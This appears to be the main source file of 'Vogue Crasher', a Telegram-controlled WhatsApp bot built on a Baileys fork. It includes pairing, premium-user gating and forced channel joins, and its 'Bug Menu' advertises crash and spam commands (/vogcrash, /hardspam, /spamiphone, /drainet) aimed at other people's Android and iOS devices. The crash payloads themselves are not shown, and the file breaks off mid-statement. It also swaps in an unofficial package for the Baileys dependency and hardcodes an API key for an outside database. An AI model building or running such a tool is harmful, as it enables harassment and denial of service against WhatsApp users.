//     _____ _   _  _____ _____ ___   _      _      
//    |_   _| \ | |/  ___|_   _/ _ \ | |    | |     
//      | | |  \| |\ `--.  | |/ /_\ \| |    | |     
//      | | | . ` | `--. \ | ||  _  || |    | |     
//     _| |_| |\  |/\__/ / | || | | || |____| |____ 
//     \___/\_| \_/\____/  \_/\_| |_/\_____/\_____/ 
//                                                  
//                                                  
//    ______  ___  _____  _   __  ___  _____  _____ 
//    | ___ \/ _ \/  __ \| | / / / _ \|  __ \|  ___|
//    | |_/ / /_\ \ /  \/| |/ / / /_\ \ |  \/| |__  
//    |  __/|  _  | |    |    \ |  _  | | __ |  __| 
//    | |   | | | | \__/\| |\  \| | | | |_\ \| |___ 
//    \_|   \_| |_/\____/\_| \_/\_| |_/\____/\____/ 
//                                                  
//                                                  

const fs = require("fs");
const { execSync } = require("child_process");

const defaultPackage = {
    name: "Vogue Crasher",
    version: "1.8",
    main: "Vogue.js",
    scripts: {
        start: "node Vogue.js"
    },
    dependencies: {
        "@whiskeysockets/baileys": "npm:@zeppeliorg/wbails",
        "axios": "^1.5.0",
        "chalk": "^4.1.2",
        "moment": "^2.29.1",
        "@octokit/rest": "latest",
        "moment-timezone": "latest",
        "pino": "^9.5.0",
        "readline-sync": "^1.4.10",
        "telegraf": "^4.16.3"
    }
};

if (!fs.existsSync("./package.json")) {
    
    console.log(`
[VOGUE] package.json not found
[VOGUE] Creating package.json...
`);
    
    fs.writeFileSync(
        "./package.json",
        JSON.stringify(
            defaultPackage,
            null,
            4
        )
    );
    
    console.log(`
[VOGUE] package.json successfully created
`);
}

const packageData = JSON.parse(
    fs.readFileSync(
        "./package.json",
        "utf8"
    )
);

const dependencies = {
    ...packageData.dependencies
};

function autoInstallPackages() {
    
    console.log(`
[VOGUE] Checking dependencies...
`);
    
    for (const pkg of Object.keys(dependencies)) {
        
        try {
            
            require(pkg);
            
            console.log(
                `[✓] ${pkg} installed`
            );
            
        } catch {
            
            console.log(
                `[!] Missing package: ${pkg}`
            );
            
            console.log(
                `[VOGUE] Installing ${pkg}...`
            );
            
            try {
                
                execSync(
                    `npm install ${pkg}`,
                    {
                        stdio: "inherit"
                    }
                );
                
                console.log(
                    `[✓] ${pkg} installed successfully`
                );
                
            } catch (err) {
                
                console.log(
                    `[X] Failed installing ${pkg}`
                );
                
                console.log(
                    err.message
                );
                
                process.exit(1);
            }
        }
    }
    
    console.log(`
[VOGUE] All dependencies ready
`);
}

autoInstallPackages();


//     _____ _____ _   _ ______ _____ _____ 
//    /  __ \  _  | \ | ||  ___|_   _|  __ \
//    | /  \/ | | |  \| || |_    | | | |  \/
//    | |   | | | | . ` ||  _|   | | | | __ 
//    | \__/\ \_/ / |\  || |    _| |_| |_\ \
//     \____/\___/\_| \_/\_|    \___/ \____/
//                                          
//                                          
//     _   _  ___  ______                   
//    | | | |/ _ \ | ___ \                  
//    | | | / /_\ \| |_/ /                  
//    | | | |  _  ||    /                   
//    \ \_/ / | | || |\ \                   
//     \___/\_| |_/\_| \_|                  
//                                          
//                                          
//     _____ _____ _   _______ ___________  
//    /  ___|  ___| \ | |  _  \  ___| ___ \ 
//    \ `--.| |__ |  \| | | | | |__ | |_/ / 
//     `--. \  __|| . ` | | | |  __||    /  
//    /\__/ / |___| |\  | |/ /| |___| |\ \  
//    \____/\____/\_| \_/___/ \____/\_| \_| 
//                                          
//                                         

const { Telegraf } = require("telegraf");
const { spawn } = require('child_process')
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const FormData = require("form-data");
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm')
const os = require('os')
const {
    default: makeWASocket,
    proto,
    useMultiFileAuthState,
    downloadContentFromMessage,
    generateWAMessageContent,
    generateWAMessage,
    prepareWAMessageMedia,
    fetchLatestBaileysVersion,
    generateWAMessageFromContent,
    DisconnectReason,
    getContentType,
    makeCacheableSignalKeyStore,
    BufferJSON,
    Browsers
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const { tokenBot, ownerID, requiredChannel } = require("./settings/config");
const axios = require('axios');
const moment = require('moment-timezone');
const EventEmitter = require('events')
const makeInMemoryStore = ({ logger = console } = {}) => {
    const ev = new EventEmitter()
    
    let chats = {}
    let messages = {}
    let contacts = {}
    
    ev.on('messages.upsert', ({ messages: newMessages, type }) => {
        for (const msg of newMessages) {
            const chatId = msg.key.remoteJid
            if (!messages[chatId]) messages[chatId] = []
            messages[chatId].push(msg)
            
            if (messages[chatId].length > 100) {
                messages[chatId].shift()
            }
            
            chats[chatId] = {
                ...(chats[chatId] || {}),
                id: chatId,
                name: msg.pushName,
                lastMsgTimestamp: +msg.messageTimestamp
            }
        }
    })
    
    ev.on('chats.set', ({ chats: newChats }) => {
        for (const chat of newChats) {
            chats[chat.id] = chat
        }
    })
    
    ev.on('contacts.set', ({ contacts: newContacts }) => {
        for (const id in newContacts) {
            contacts[id] = newContacts[id]
        }
    })
    
    return {
        chats,
        messages,
        contacts,
        bind: (evTarget) => {
            evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
            evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
            evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
        },
        logger
    }
}
const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});
const thumbnailUrl = "https://files.catbox.moe/eyhahn.png";
const bot = new Telegraf(tokenBot);
let sock;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;
const lastClaim = new Map();
const messageLog = new Map();
let restarting = false;
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
const premiumFile = './database/premium.json';
const premiumGroupFile = './database/premiumgroup.json';
const activeAnimatedMenus = new Map();
const lockedMenus = new Set();
const styleCycle = ["primary", "success", "danger"];
let pingInterval = null;
let socketStarted = false;
const cooldown = new Map();
let globalCooldown = 0;
let spamQueue = [];
let queueRunning = false;
const queueFile = "./database/spamQueue.json";
const MAINTENANCE_FILE = "./database/maintenance.json";
const TASK_DURATION = (30 * 3000) + (3 * 60 * 1000);
const DB_API = "https://db.quietxhub.my.id";
const API_KEY = "VGXDATABASE";
let socketReady = false;
let reconnecting = false;
let reconnectTimeout;
let presenceInterval;
let currentStyleIndex = 0;
let workerStarted = false;
const activeButtons = new Map();
const TASK_FILE ="./database/sendtasks.json";

const hasClaimedFreePremium = (userId) => {
    const data = loadClaimed();
    return !!data[userId];
};

const markClaimedFreePremium = (userId) => {
    const data = loadClaimed();
    data[userId] = true;
    saveClaimed(data);
};

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addPremiumUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    if (
        userId.toString() ===
        ownerID.toString()
    ) {
        
        return true;
    }
    
    const premiumUsers =
        loadPremiumUsers();
    
    if (
        premiumUsers[userId]
    ) {
        
        const expiryDate =
            moment(
                premiumUsers[userId],
                "DD-MM-YYYY"
            );
        
        if (
            moment().isBefore(
                expiryDate
            )
        ) {
            
            return true;
            
        } else {
            
            removePremiumUser(
                userId
            );
            
            return false;
        }
    }
    
    return false;
};

if (!fs.existsSync(premiumGroupFile)) {
    fs.writeFileSync(
        premiumGroupFile,
        JSON.stringify(
            [],
            null,
            2
        )
    );
}

function loadPremiumGroups() {
    return JSON.parse(
        fs.readFileSync(
            premiumGroupFile
        )
    );
}

function savePremiumGroups(data) {
    fs.writeFileSync(
        premiumGroupFile,
        JSON.stringify(
            data,
            null,
            2
        )
    );
}

function isPremiumGroup(chatId) {
    
    const groups =
        loadPremiumGroups();
    
    return groups.includes(
        chatId.toString()
    );
}

function checkPremiumAccess(ctx, next) {
    
    const userId =
        ctx.from.id.toString();
    
    const chatId =
        ctx.chat.id.toString();
    
    if (
        userId ===
        ownerID.toString()
    ) {
        
        return next();
    }
    
    const premiumUsers =
        loadPremiumUsers();
    
    const userPremium =
        premiumUsers[userId];
    
    const groupPremium =
        isPremiumGroup(
            chatId
        );
    
    if (
        userPremium ||
        groupPremium
    ) {
        
        return next();
    }
    
    return ctx.reply(
        `Access Denied

This feature is restricted to premium users or premium groups.`
    );
}

const checkPremium = (ctx,next) => {
    
    if (
        ctx.from.id.toString() ===
        ownerID.toString()
    ) {
        
        return next();
    }
    
    if (
        !isPremiumUser(
            ctx.from.id
        )
    ) {
        
        ctx.reply(
            "❌ ☇ Akses hanya untuk premium"
        );
        
        return;
    }
    
    next();
};

//     _____  _____ _____  _   __ _____ _____                
//    /  ___||  _  /  __ \| | / /|  ___|_   _|               
//    \ `--. | | | | /  \/| |/ / | |__   | |                 
//     `--. \| | | | |    |    \ |  __|  | |                 
//    /\__/ /\ \_/ / \__/\| |\  \| |___  | |                 
//    \____/  \___/ \____/\_| \_/\____/  \_/                 
//                                                           
//                                                           
//     _____ _____ ___  ______ _____ _     _____ _______   __
//    /  ___|_   _/ _ \ | ___ \_   _| |   |_   _|_   _\ \ / /
//    \ `--.  | |/ /_\ \| |_/ / | | | |     | |   | |  \ V / 
//     `--. \ | ||  _  || ___ \ | | | |     | |   | |   \ /  
//    /\__/ / | || | | || |_/ /_| |_| |_____| |_  | |   | |  
//    \____/  \_/\_| |_/\____/ \___/\_____/\___/  \_/   \_/  
//                                                           
//                                                           
//     _______   _______ _____ ________  ___                 
//    /  ___\ \ / /  ___|_   _|  ___|  \/  |                 
//    \ `--. \ V /\ `--.  | | | |__ | .  . |                 
//     `--. \ \ /  `--. \ | | |  __|| |\/| |                 
//    /\__/ / | | /\__/ / | | | |___| |  | |                 
//    \____/  \_/ \____/  \_/ \____/\_|  |_/                 
//                                                           
//                                                           

const clearSocketIntervals = () => {

    if (presenceInterval) {

        clearInterval(
            presenceInterval
        );

        presenceInterval = null;
    }

    if (reconnectTimeout) {

        clearTimeout(
            reconnectTimeout
        );

        reconnectTimeout = null;
    }
};

const destroySocket = async () => {
    
    try {
        
        socketReady = false;
        
        clearSocketIntervals();
        
        if (sock) {
            
            try {
                
                sock.ev.removeAllListeners();
                
            } catch {}
            
            try {
                
                sock.ws.close();
                
            } catch {}
            
            try {
                
                sock.end();
                
            } catch {}
            
            sock = null;
        }
        
    } catch (e) {
        
        console.log(
            `[DESTROY SOCKET ERROR] ${e.message}`
        );
    }
};

const store = makeInMemoryStore({
    logger: require("pino")().child({
        level: "silent",
        stream: "store"
    })
});

const startSesi = async () => {
    console.clear();
    console.log(chalk.bold.yellow(`
______████ _
_____██████ _
____████████__________ ▌
___███____███_________ █
___██_______██__________▌
__███________█__________▌
__▌●█________█_________█
__███_______ █_________█
___██_______█________██
____█______██______███_ █
_____▌_____██_____████_█
__________███___█████_█_█
________███__██████__█_█
______███__████____██_█
_____███_█████_████_█
____████_██████_███_█__▌
___████_█ █__███ _█__██_▌
__█████_████_▌_█_███_▌
_█████_██___██___██_█
_█████_███████_███__█__██
_███_▌███___██____██_███
_███_▌█████___███__█__█
_████_▌▌___█__█_██████
__██████_████__▌_████
___█████_____████████
._=--███████████████
_=--=_-████████████
=--_=-_=-█████████
» Information:
  Developer: Prince
  Version: 1.8 Stable
  Status: Bot Connected
  `))
    
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();
    
    const connectionOptions = {
        version,
        keepAliveIntervalMs: 10000,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 60000,
        syncFullHistory: false,
        markOnlineOnConnect: true,
        fireInitQueries: false,
        generateHighQualityLinkPreview: false,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ["Mac OS", "Safari", "17.0"]
    };
    sock = makeWASocket(connectionOptions);
    
    // ========================================
    // ANTI TIMEOUT HEARTBEAT
    // ========================================
    
    clearSocketIntervals();
    
    sock.ev.on("messages.upsert", async ({ messages }) => {
        
        const msg = messages[0];
        
        if (!msg.message) return;
        
        const sender = msg.key.remoteJid;
        
        messageLog.set(sender, {
            id: msg.key.id,
            sender: sender,
            pushName: msg.pushName || "Unknown",
            text: msg.message.conversation ||
                msg.message.extendedTextMessage?.text ||
                "[MEDIA/OTHER]",
            timestamp: msg.messageTimestamp,
            type: Object.keys(msg.message)[0]
        });
        
    });
    
    
    
    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === "open") {
            
            socketReady = true;
            
            reconnecting = false;
            socketStarted = true;
            clearSocketIntervals();
            
            setTimeout(() => {
                startUniversalWorker();
            }, 5000);
            
            if (lastPairingMessage) {
                const connectedMenu = `
\`\`\`ruby
VOGUE CRASH • PAIRING SYSTEM
────────────────────────────

Session Information

Client Name   : Vogue Crasher
Developer     : @PrinceXVogue
Version       : 1.8 Stable
Prefix        : /

────────────────────────────

Registered Number :
${lastPairingMessage.phoneNumber}

Pairing Code :
${lastPairingMessage.pairingCode}

Connection Status Connected and Operational

──────────────────────────────
The sender session has been successfully initialized and is ready for use.
\`\`\``;
                
                try {
                    bot.telegram.editMessageCaption(
                        lastPairingMessage.chatId,
                        lastPairingMessage.messageId,
                        undefined,
                        connectedMenu, { parse_mode: "markdown" }
                    );
                } catch (e) {}
            }
            
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.yellow(`
▒█░░▒█ ▒█▀▀▀█ ▒█▀▀█ ▒█░▒█ ▒█▀▀▀ 
░▒█▒█░ ▒█░░▒█ ▒█░▄▄ ▒█░▒█ ▒█▀▀▀ 
░░▀▄▀░ ▒█▄▄▄█ ▒█▄▄█ ░▀▄▄▀ ▒█▄▄▄ 

▒█▀▀█ ▒█▀▀█ ░█▀▀█ ▒█▀▀▀█ ▒█░▒█ ▒█▀▀▀ ▒█▀▀█ 
▒█░░░ ▒█▄▄▀ ▒█▄▄█ ░▀▀▀▄▄ ▒█▀▀█ ▒█▀▀▀ ▒█▄▄▀ 
▒█▄▄█ ▒█░▒█ ▒█░▒█ ▒█▄▄▄█ ▒█░▒█ ▒█▄▄▄ ▒█░▒█
» Information:
  Developer: Prince
  Version: 1.8 Stable
  Status: Sender Connected
  `))
            pingInterval = setInterval(() => {
                try {
                    
                    if (
                        sock &&
                        sock.ws
                    ) {
                        
                    }
                    
                } catch {}
                
            }, 120000);
        }
        
        if (connection === 'close') {
            
            isWhatsAppConnected = false;
            socketReady = false;
            
            const statusCode =
                lastDisconnect?.error?.output?.statusCode;
            
            const shouldReconnect =
                statusCode !== DisconnectReason.loggedOut;
            
            console.log(
                chalk.red(`
        [VOGUE SOCKET CLOSED]
        
        Status Code : ${statusCode}
        Reconnect   : ${shouldReconnect}
        `)
            );
            
            if (!shouldReconnect) {
                
                console.log(
                    chalk.red(
                        "Session logged out."
                    )
                );
                
                return;
            }
            
            // ========================================
            // ANTI MULTIPLE RECONNECT
            // ========================================
            
            if (reconnecting) return;
            
            reconnecting = true;
            
            reconnectTimeout = setTimeout(async () => {
                
                try {
                    
                    console.log(`
        [VOGUE RECONNECT]
        
        Destroying old socket...
        `);
                    
                    await destroySocket();
                    
                    console.log(`
        [VOGUE RECONNECT]
        
        Starting fresh session...
        `);
                    
                    await destroySocket();
                    
                    reconnecting = false;
                    
                    startSesi();
                    
                } catch (err) {
                    
                    reconnecting = false;
                    
                    console.log(
                        `[RECONNECT ERROR] ${err.message}`
                    );
                }
                
            }, 5000);
        }
    });
};

process.on(
    "uncaughtException",
    async (err) => {
        
        const msg =
            err?.message || String(err);
        
        console.log(
            `[!] Error Strike: ${msg}`
        );
        
        const shouldRestart =
            msg.includes("Connection Closed") ||
            msg.includes("Timed Out") ||
            msg.includes("Connection Failure") ||
            msg.includes("Stream Errored") ||
            msg.includes("Precondition Required");
        
        if (!shouldRestart) return;
        
        console.log(
            "[VOGUE CRASHER] Restart Triggered"
        );
        
        try {
            
            await destroySocket();
            
        } catch {}
        
        setTimeout(() => {
            process.exit(1);
        }, 2000);
    }
);

process.on(
    "unhandledRejection",
    async (err) => {
        
        const msg =
            err?.message || String(err);
        
        console.log(
            `[!] Error Strike: ${msg}`
        );
        
        const shouldRestart =
            msg.includes("Connection Closed") ||
            msg.includes("Timed Out") ||
            msg.includes("Connection Failure") ||
            msg.includes("Stream Errored") ||
            msg.includes("Precondition Required");
        
        if (!shouldRestart) return;
        
        console.log(
            "[VOGUE CRASHER] Restart Triggered"
        );
        
        try {
            
            await destroySocket();
            
        } catch {}
        
        setTimeout(() => {
            process.exit(1);
        }, 2000);
    }
);


startSesi();

restoreQueue();

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

//     _____  _   _   ___   _   _  _   _  _____ _     
//    /  __ \| | | | / _ \ | \ | || \ | ||  ___| |    
//    | /  \/| |_| |/ /_\ \|  \| ||  \| || |__ | |    
//    | |    |  _  ||  _  || . ` || . ` ||  __|| |    
//    | \__/\| | | || | | || |\  || |\  || |___| |____
//     \____/\_| |_/\_| |_/\_| \_/\_| \_/\____/\_____/
//                                                    
//                                                    
//     _______   _______ _____ ________  ___          
//    /  ___\ \ / /  ___|_   _|  ___|  \/  |          
//    \ `--. \ V /\ `--.  | | | |__ | .  . |          
//     `--. \ \ /  `--. \ | | |  __|| |\/| |          
//    /\__/ / | | /\__/ / | | | |___| |  | |          
//    \____/  \_/ \____/  \_/ \____/\_|  |_/          
//                                                    
//                                                    

async function checkChannelMembership(ctx) {
    
    try {
        
        if (!ctx.from) {
            return false;
        }
        
        const notJoined = [];
        
        for (const channel of requiredChannel) {
            
            try {
                
                // =========================
                // CHECK BOT ACCESS
                // =========================
                
                const botData =
                    await ctx.telegram.getMe();
                
                const botMember =
                    await ctx.telegram.getChatMember(
                        channel,
                        botData.id
                    );
                
                // bot must exist
                if (
                    [
                        "left",
                        "kicked"
                    ].includes(botMember.status)
                ) {
                    
                    console.log(
                        `[CHANNEL ERROR]
Bot is not inside ${channel}`
                    );
                    
                    notJoined.push(channel);
                    
                    continue;
                }
                
                // =========================
                // CHECK USER MEMBERSHIP
                // =========================
                
                const member =
                    await ctx.telegram.getChatMember(
                        channel,
                        ctx.from.id
                    );
                
                const allowedStatus = [
                    "creator",
                    "administrator",
                    "member"
                ];
                
                if (
                    !allowedStatus.includes(
                        member.status
                    )
                ) {
                    notJoined.push(channel);
                }
                
            } catch (err) {
                
                console.log(
                    `[JOIN CHECK ERROR]
${channel}
${err.message}`
                );
                
                notJoined.push(channel);
            }
        }
        
        // =========================
        // NOT JOINED
        // =========================
        
        if (notJoined.length > 0) {
            
            const buttons = [];
            
            for (const channel of requiredChannel) {
                
                buttons.push([
                {
                    text: `Join ${channel}`,
                    url:
                    `https://t.me/${
                        channel.replace("@", "")
                    }`
                }]);
            }
            
            buttons.push([
            {
                text: "I've Joined",
                callback_data: "recheck_join"
            }]);
            
            await ctx.replyWithPhoto(
                thumbnailUrl,
                {
                    caption: `
\`\`\`ruby
V O G U E • V E R I F I C A T I O N
──────────────────────────

Access Denied

Before using this bot,
you must join all required
Telegram channels first.

Required Channels:

${requiredChannel.join("\n")}

──────────────────────────

After joining all channels,
press the verification button below.
\`\`\`
`,
                    parse_mode: "markdown",
                    
                    reply_markup: {
                        inline_keyboard: buttons
                    }
                }
            );
            
            return false;
        }
        
        return true;
        
    } catch (err) {
        
        console.log(
            `[JOIN SYSTEM ERROR]
${err.message}`
        );
        
        return false;
    }
}

bot.use(async (ctx, next) => {
    
    if (ctx.from?.id == ownerID) {
        return next();
    }
    
    if (!ctx.from) {
        return;
    }
    
    const allowed =
        await checkChannelMembership(ctx);
    
    if (!allowed) {
        return;
    }
    
    return next();
});

bot.action(
    "recheck_join",
    async (ctx) => {
        
        const allowed =
            await checkChannelMembership(ctx);
        
        if (allowed) {
            
            await ctx.answerCbQuery(
                "Verification successful"
            );
            
            try {
                
                await ctx.deleteMessage();
                
            } catch {}
            
            return ctx.reply(
                `Access Granted

You can now use the bot normally.`
            );
        }
        
        return ctx.answerCbQuery(
            "You have not joined all channels yet",
            {
                show_alert: true
            }
        );
    }
);

//     _____ _____ ___  ______ _____ 
//    /  ___|_   _/ _ \ | ___ \_   _|
//    \ `--.  | |/ /_\ \| |_/ / | |  
//     `--. \ | ||  _  ||    /  | |  
//    /\__/ / | || | | || |\ \  | |  
//    \____/  \_/\_| |_/\_| \_| \_/  
//                                   
//                                   
//    ______  _____ _____            
//    | ___ \|  _  |_   _|           
//    | |_/ /| | | | | |             
//    | ___ \| | | | | |             
//    | |_/ /\ \_/ / | |             
//    \____/  \___/  \_/             
//                                   
//                                   

bot.start(async (ctx) => {
    
    // 1. ANIMASI TEXT ONLY
    const loading = await ctx.reply(`INITIALIZING SYSTEM...`);
    
    const frames = [
        "⣷ Initializing system...",
        "⣯ Loading modules...",
        "⣟ Connecting services...",
        "⡿ Preparing interface...",
        "⣿ Finalizing..."
    ];
    
    for (let i = 0; i < frames.length; i++) {
        await new Promise(r => setTimeout(r, 500));
        
        await ctx.telegram.editMessageText(
            ctx.chat.id,
            loading.message_id,
            undefined,
            frames[i]
        );
    }
    
    await new Promise(r => setTimeout(r, 400));
    
    // 2. MENU UTAMA (PAKAI IMAGE SEPERTI REQUEST KAMU)
    const menuMessage = `
\`\`\`ruby
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

◈ User      : ${ctx.from.first_name}
◈ Developer : @PrinceXVogue
◈ Version   : 1.8 Stable
◈ Prefix    : /

━━━━━━━━━━━━━━━━━━━━━━

Multi Session Management
Real-Time Automation
WhatsApp Core System

━━━━━━━━━━━━━━━━━━━━━━

System Status :
ONLINE & STABLE
\`\`\``;
    
    const keyboard = {
        inline_keyboard: [
            [
                { text: "All Menu", callback_data: "/controls" },
                { text: "Bug Menu", callback_data: "/bug" }
            ],
            [
                { text: "Developer", callback_data: "/tqto" }
            ]
        ]
    };
    
    await ctx.telegram.deleteMessage(ctx.chat.id, loading.message_id);
    
    await ctx.replyWithPhoto(thumbnailUrl, {
        caption: menuMessage,
        parse_mode: "Markdown",
        reply_markup: keyboard,
    });
    
});

bot.action('/start', async (ctx) => {
    
    const menuMessage = `
\`\`\`ruby
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

◈ User      : ${ctx.from.first_name}
◈ Developer : @PrinceXVogue
◈ Version   : 1.8 Stable
◈ Prefix    : /

━━━━━━━━━━━━━━━━━━━━━━

Multi Session Management
Real-Time Automation
WhatsApp Core System

━━━━━━━━━━━━━━━━━━━━━━

System Status :
ONLINE & STABLE
\`\`\``;
    
    const keyboard = [
        [
            { text: "All Menu", callback_data: "/controls" },
            { text: "Bug Menu", callback_data: "/bug" }
        ],
        [
            { text: "Developer", callback_data: "/tqto" }
        ]
    ];
    
    try {
        
        const sent = await ctx.editMessageMedia(
        {
            type: 'photo',
            media: thumbnailUrl,
            caption: menuMessage,
            parse_mode: "markdown",
        },
        {
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
        
        
    } catch (error) {
        
        if (
            error.response &&
            error.response.error_code === 400 &&
            error.response.description ===
            "Bad Request: message is not modified"
        ) {
            
            await ctx.answerCbQuery();
            
        } else {
            
            console.log(
                `[START ERROR] ${error.message}`
            );
        }
    }
});

bot.action('/controls', async (ctx) => {
    const controlsMenu = `
\`\`\`ruby
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

◈ User      : ${ctx.from.first_name}
◈ Developer : @PrinceXVogue
◈ Version   : 1.8 Stable
◈ Prefix    : /

━━━━━━━━━━━━━━━━━━━━━━

〔 OWNER MANAGE 〕
› /reqpair
› /killsession
› /info
› /restartbot
› /update
› /ping

━━━━━━━━━━━━━━━━━━━━━━

〔 PREMIUM ACCESS 〕
› /addprem
› /delprem
› /listprem
› /addgrup
› /delgrup

━━━━━━━━━━━━━━━━━━━━━━

〔 TOOLS MENU 〕
› /tourl
› /sticker
› /forensic

━━━━━━━━━━━━━━━━━━━━━━

System Status :
ONLINE & OPERATIONAL
\`\`\``;
    
    const keyboard = [
        [
            {
                text: "Back To Menu",
                callback_data: "/start"
            }
        ]
    ];
    
    try {
        
        await ctx.editMessageCaption(
            controlsMenu,
            {
                parse_mode: "markdown",
                reply_markup: {
                    inline_keyboard: keyboard
                }
            }
        );
        
    } catch (error) {
        
        try {
            await ctx.answerCbQuery();
        } catch {}
        
    }
    
});

bot.action('/bug', async (ctx) => {
    const bugMenu = `
\`\`\`ruby
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

◈ User      : ${ctx.from.first_name}
◈ Developer : @PrinceXVogue
◈ Version   : 1.8 Stable
◈ Prefix    : /

━━━━━━━━━━━━━━━━━━━━━━

〔 ANDROID MODULE 〕
› /spamandro
› /hardspam
› /voguehard
› /drainet
› /vogcrash

━━━━━━━━━━━━━━━━━━━━━━

〔 IOS MODULE 〕
› /spamiphone

━━━━━━━━━━━━━━━━━━━━━━

System Status :
MODULES ACTIVE
\`\`\``;
    
    const keyboard = [
        [
            {
                text: "Back",
                callback_data: "/start"
            }
        ]
    ];
    
    try {
        await ctx.editMessageCaption(bugMenu, {
            parse_mode: "markdown",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "Bad Request: message is not modified") {
            await ctx.answerCbQuery();
        } else {}
    }
});

bot.action('/tqto', async (ctx) => {
    const tqtoMenu = `
\`\`\`ruby
━━━━━━━━━━━━━━━━━━━━━━
V O G U E • C R A S H E R
━━━━━━━━━━━━━━━━━━━━━━

◈ User      : ${ctx.from.first_name}
◈ Developer : @PrinceXVogue
◈ Version   : 1.8 Stable
◈ Prefix    : /

━━━━━━━━━━━━━━━━━━━━━━

〔 SUPPORT TEAM 〕
› @PrinceXVogue

━━━━━━━━━━━━━━━━━━━━━━

Official Build :
VOGUE CRASHER
\`\`\``;
    
    const keyboard = [
        [
            {
                text: "Return to Main Menu",
                callback_data: "/start"
            }
        ]
    ];
    
    try {
        
        await ctx.editMessageCaption(tqtoMenu, {
            parse_mode: "markdown",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
        
    } catch (error) {
        
        if (
            error.response &&
            error.response.error_code === 400 &&
            error.response.description === "Bad Request: message is not modified"
        ) {
            
            await ctx.answerCbQuery();
            
            console.log(
                "[VOGUE CRASHER] Message update skipped because the content is identical."
            );
            
        } else {
            
            console.log(
                "[VOGUE CRASHER] Failed to update acknowledgement panel."
            );
            
        }
    }
});

//     _____ _____ _   _______ ___________            
//    /  ___|  ___| \ | |  _  \  ___| ___ \           
//    \ `--.| |__ |  \| | | | | |__ | |_/ /           
//     `--. \  __|| . ` | | | |  __||    /            
//    /\__/ / |___| |\  | |/ /| |___| |\ \            
//    \____/\____/\_| \_/___/ \____/\_| \_|           
//                                                    
//                                                    
//     _____ ________  ______  ___  ___   _   _______ 
//    /  __ \  _  |  \/  ||  \/  | / _ \ | \ | |  _  \
//    | /  \/ | | | .  . || .  . |/ /_\ \|  \| | | | |
//    | |   | | | | |\/| || |\/| ||  _  || . ` | | | |
//    | \__/\ \_/ / |  | || |  | || | | || |\  | |/ / 
//     \____/\___/\_|  |_/\_|  |_/\_| |_/\_| \_/___/  
//                                                    
//                                                    

bot.command("reqpair", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    const args = ctx.message.text.split(" ")[1];
    if (!args) return ctx.reply("🪧 ☇ Format: /reqpair 62×××");
    
    const phoneNumber = args.replace(/[^0-9]/g, "");
    if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");
    
    try {
        if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
        if (sock.authState.creds.registered) {
            return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
        }
        
        let customcode = "XXVOGUEX"
        const code = await sock.requestPairingCode(phoneNumber, customcode);
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;
        
        const pairingMenu = `
\`\`\`ruby
VOGUE CRASH • PAIRING SYSTEM
──────────────────────────── 

Welcome, ${ctx.from.first_name}

This system is connected to the
Trash Matrix WhatsApp engine.

Session Information

Developer     : @PrinceXVogue
Version       : 1.8 Stable
Prefix        : /

────────────────────────────

Target Number
${phoneNumber}

Pairing Code
${formattedCode}

Connection Status
Waiting for Authentication

──────────────────────────────
Open WhatsApp Linked Devices and
enter the pairing code above to
complete the authorization process.
\`\`\``;
        
        const sentMsg = await ctx.replyWithPhoto(thumbnailUrl, {
            caption: pairingMenu,
            parse_mode: "markdown"
        });
        
        lastPairingMessage = {
            chatId: ctx.chat.id,
            messageId: sentMsg.message_id,
            phoneNumber,
            pairingCode: formattedCode
        };
        
    } catch (err) {
        console.error(err);
    }
});

if (sock) {
